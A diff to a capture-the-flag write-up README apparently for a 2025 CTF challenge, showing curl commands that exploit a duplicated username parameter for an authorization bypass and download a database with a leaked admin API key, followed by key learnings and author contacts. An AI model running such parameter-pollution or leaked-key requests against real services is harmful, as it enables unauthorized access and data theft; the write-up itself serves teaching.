@@ -38,3 +38,25 @@ curl -s "https://tlctf2025-api.chals.io/api/balance?username=akhter&username=adm
 3. Download DB Using Leaked Admin Key
 curl -s -o runtime_db.csv \
  "https://tlctf2025-data-app.chals.io/download_db?api_key=6208d4e88be3d7a2c6845189a23954420f037a262d13a833b9ace3ef98a35ee0"
+
+
+### 📌 Key Learnings
+Minor parsing/logical flaws can escalate to full authorization bypasses.
+
+Shipping secrets (e.g., ADMIN_API_KEY, FLAG_SECRET) in public distributions leads to immediate compromise.
+
+Reusing predictable PRNGs or keystreams breaks confidentiality for XOR-style stream ciphers.
+
+### 📁 Included File
+TrustCTF_Write-Up.pdf — Full write-up (uploaded). Download path (local):
+/mnt/data/2bdd655e-b14d-4d5d-863b-6216dfb25d5e.pdf
+
+### 👤 Authors
+
+Kamal Akhter
+
+Email: akhterkamal815@gmail.com
+
+Syed Misbah Uddin
+
+Email: bytesyed@gmail.com
